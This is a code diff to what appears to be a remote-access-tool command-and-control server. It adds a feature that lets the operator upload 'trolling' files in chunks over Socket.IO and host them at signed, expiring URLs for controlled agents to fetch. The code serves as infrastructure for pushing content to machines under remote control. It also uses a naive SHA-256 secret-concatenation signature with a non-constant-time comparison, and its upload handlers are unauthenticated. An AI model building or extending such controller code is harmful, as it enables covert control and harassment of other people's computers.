@@ -32,6 +32,7 @@ import re
 import mimetypes
 from typing import Optional
 import io
+import uuid
 import pyotp
 import qrcode
 
@@ -2508,6 +2509,10 @@ AGENT_FEATURE_FLAGS = defaultdict(lambda: dict(FEATURE_FLAGS_DEFAULT))
 MIN_STREAM_CHUNK = 256 * 1024
 MAX_STREAM_CHUNK = 8 * 1024 * 1024
 
+# Controller-hosted trolling assets (operator uploads -> agent fetch via signed URL)
+TROLL_UPLOADS = {}
+TROLL_ASSETS = {}
+
 def _get_stream_chunk_size(agent_id: str) -> int:
     try:
         s = STREAM_SETTINGS.get(agent_id) or {}
@@ -3661,6 +3666,25 @@ def thumbnail_agent_file(agent_id):
     resp.headers['Content-Disposition'] = 'inline'
     return resp
 
+# Serve controller-hosted trolling assets
+@app.route('/troll-assets/<asset_id>')
+def serve_troll_asset(asset_id):
+    try:
+        exp = int(request.args.get('exp') or 0)
+        sig = request.args.get('sig') or ''
+        if exp <= int(time.time()):
+            return ("expired", 410)
+        sig_src = f'{asset_id}.{exp}.{Config.SECRET_KEY}'
+        expected = hashlib.sha256(sig_src.encode()).hexdigest()
+        if sig != expected:
+            return ("forbidden", 403)
+        meta = TROLL_ASSETS.get(asset_id)
+        if not meta or not os.path.isfile(meta['path']):
+            return ("not found", 404)
+        mime = mimetypes.guess_type(meta['path'])[0] or 'application/octet-stream'
+        return send_file(meta['path'], mimetype=mime)
+    except Exception:
+        return ("server error", 500)
 # System Monitoring API
 @app.route('/api/system/stats', methods=['GET'])
 @require_auth
@@ -4814,6 +4838,77 @@ def handle_upload_file_complete(data):
             'total_size': data.get('total_size', 0)
         }, room=agent_sid)
         print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")
+
+@socketio.on('troll_asset_start')
+def handle_troll_asset_start(data):
+    upload_id = data.get('upload_id') or f'troll_{int(time.time())}'
+    filename = data.get('filename') or 'asset.bin'
+    total_size = int(data.get('total_size') or 0)
+    TROLL_UPLOADS[upload_id] = {
+        'filename': filename,
+        'total_size': total_size,
+        'received': 0,
+        'chunks': [],
+        'start_time': time.time()
+    }
+    emit('troll_asset_ready', {'upload_id': upload_id, 'status': 'started'}, room=request.sid)
+
+@socketio.on('troll_asset_chunk')
+def handle_troll_asset_chunk(data):
+    upload_id = data.get('upload_id')
+    if not upload_id or upload_id not in TROLL_UPLOADS:
+        return
+    payload = data.get('chunk')
+    offset = int(data.get('offset') or 0)
+    up = TROLL_UPLOADS[upload_id]
+    try:
+        if isinstance(payload, str):
+            raw = base64.b64decode(payload)
+        else:
+            raw = bytes(payload or b'')
+    except Exception:
+        raw = bytes(payload or b'')
+    up['chunks'].append((offset, raw))
+    up['received'] += len(raw)
+    progress = 0
+    if up['total_size'] > 0:
+        progress = int((up['received'] / up['total_size']) * 100)
+    emit('troll_asset_progress', {'upload_id': upload_id, 'received': up['received'], 'total': up['total_size'], 'progress': progress}, room=request.sid)
+
+@socketio.on('troll_asset_complete')
+def handle_troll_asset_complete(data):
+    upload_id = data.get('upload_id')
+    if not upload_id or upload_id not in TROLL_UPLOADS:
+        emit('troll_asset_ready', {'upload_id': upload_id, 'error': 'unknown upload'}, room=request.sid)
+        return
+    up = TROLL_UPLOADS.pop(upload_id)
+    up['chunks'].sort(key=lambda x: x[0])
+    file_bytes = b''.join([c for _, c in up['chunks']])
+    assets_dir = os.path.join(os.path.dirname(__file__), 'troll-assets')
+    os.makedirs(assets_dir, exist_ok=True)
+    asset_id = uuid.uuid4().hex
+    _, ext = os.path.splitext(up['filename'])
+    filename = f'{asset_id}{ext or ""}'
+    full_path = os.path.join(assets_dir, filename)
+    with open(full_path, 'wb') as f:
+        f.write(file_bytes)
+    expires = int(time.time() + 3600)
+    sig_src = f'{asset_id}.{expires}.{Config.SECRET_KEY}'
+    signature = hashlib.sha256(sig_src.encode()).hexdigest()
+    TROLL_ASSETS[asset_id] = {
+        'path': full_path,
+        'filename': up['filename'],
+        'expires': expires,
+        'created_at': time.time(),
+        'size': len(file_bytes)
+    }
+    # Build absolute URL
+    try:
+        base_url = request.host_url.rstrip('/')
+    except Exception:
+        base_url = f"http://{Config.HOST}:{Config.PORT}"
+    url = f"{base_url}/troll-assets/{asset_id}?exp={expires}&sig={signature}"
+    emit('troll_asset_ready', {'upload_id': upload_id, 'asset_id': asset_id, 'url': url, 'size': len(file_bytes)}, room=request.sid)
 
 @socketio.on('download_file')
 def handle_download_file(data):
